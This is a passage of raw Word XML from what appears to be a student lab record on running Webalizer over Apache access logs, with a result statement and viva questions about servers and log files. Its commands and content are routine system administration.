      </w:r>
    </w:p>
    <w:p w14:paraId="35C6CCB7" w14:textId="34D3D00A" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>8. Run Webalizer on Apache logs:sudo webalizer -o /var/www/html/webalizer /var/log/apache2/access.log</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A849BF" w14:textId="774E695D" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">9.Open the browser and view the report at: </w:t>
      </w:r>
      <w:hyperlink r:id="rId112" w:history="1">
        <w:r w:rsidR="00473FAE" w:rsidRPr="00E84C58">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
            <w:sz w:val="28"/>
          </w:rPr>
          <w:t>http://localhost/webalizer/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B688807" w14:textId="77777777" w:rsidR="00473FAE" w:rsidRDefault="00473FAE" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2121DFE2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>OUTPUT:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B969D1F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1674B2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0E0DA719" wp14:editId="3CD032D7">
            <wp:extent cx="5731510" cy="1910503"/>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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1910503"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1487A09E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1A3B23E5" wp14:editId="69DCCE19">
            <wp:extent cx="5731509" cy="1447158"/>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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="1447158"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3229799B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="56DB80FA" wp14:editId="3DEFE63D">
            <wp:extent cx="5731510" cy="2513486"/>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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2513486"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2B0F97" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37608FD2" wp14:editId="0E7A4714">
            <wp:extent cx="5731509" cy="1180577"/>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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="1180577"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B01FD5B" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="36615C4F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0405914D" wp14:editId="64A3F1F0">
            <wp:extent cx="5731509" cy="2741984"/>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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="2741984"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="501F0AC8" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="00858285" wp14:editId="1CECE53C">
            <wp:extent cx="5731510" cy="2196127"/>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8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2196127"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="51ED6A74" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4722FC20" wp14:editId="242F27FD">
            <wp:extent cx="5731510" cy="2970484"/>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9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2970484"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C19CF24" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="252C5A3E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="401DD44D" wp14:editId="53665B13">
            <wp:extent cx="5731510" cy="2805457"/>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0"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="2805457"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="318EBEE9" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="18C0BE39" wp14:editId="354E4DC6">
            <wp:extent cx="5731509" cy="3103774"/>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1"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731509" cy="3103774"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FB46DE1" w14:textId="77777777" w:rsidR="00B44971" w:rsidRDefault="00B44971" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C3EC7F0" w14:textId="1FD66A30" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>RESULT :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F890D1E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Webalizer was successfully installed and used to analyze the server logs. The generated reports displayed traffic details, server usage, and request statistics.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67C903F3" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="42412233" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47AC1073" w14:textId="02617E9D" w:rsidR="00812B48" w:rsidRPr="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Viva Questions :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25A96921" w14:textId="472A7116" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is Webalizer?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F32E762" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Webalizer is a web server log analysis tool that generates graphical and statistical reports from server log files.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE396FC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. What is a server?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C24091A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>A server is a computer or software that provides services, resources, or data to other computers called clients over a network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D7E1632" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. What is a log file?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09263749" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>A log file is a file that records events, activities, and requests occurring on a server or application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A23AB10" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4. Why is Webalizer used?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6566397C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Webalizer is used to analyze server logs and generate reports about website traffic, visitors, page views, and resource usage.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DB83E7D" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>5. Name some common types of servers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4041FF3A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Some common types of servers are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE9284A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Web Server </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11BB7F05" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">File Server </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61049804" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Mail Server </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0848A9F2" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Database Server </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AC703E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Application Server </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005AF7BC" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t></w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">DNS Server </w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="0094061E" w:rsidSect="00034616">
      <w:pgSz w:w="11909" w:h="16834"/>
      <w:pgMar w:top="504" w:right="720" w:bottom="504" w:left="720" w:header="720" w:footer="720" w:gutter="0"/>
      <w:pgBorders w:zOrder="back" w:offsetFrom="page">
        <w:top w:val="single" w:sz="4" w:space="18" w:color="808080"/>
        <w:left w:val="single" w:sz="4" w:space="18" w:color="808080"/>
        <w:bottom w:val="single" w:sz="4" w:space="18" w:color="808080"/>
        <w:right w:val="single" w:sz="4" w:space="18" w:color="80808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E8050C"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A81CB4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 w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="02BA3BAA"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5DA042C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090E0DE6"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D9CE45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 w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0E824CEE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A68E0C9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3" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="140402DF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="CFEE8B6E"/>
    <w:lvl w:ilvl="0" w:tplc="FFFFFFFF">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146056C1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D9DA1B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BD4CD5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="800E03F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D673458"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="B54CDB1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7482F08"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="99C2508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8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="290D1665"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A042A134"/>
    <w:lvl w:ilvl="0" w:tplc="40090001">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2700" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="40090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3420" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="40090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4140" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="40090001" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4860" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Symbol" w:hAnsi="Symbol" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="40090003" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val="o"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5580" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New" w:cs="Courier New" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="40090005" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
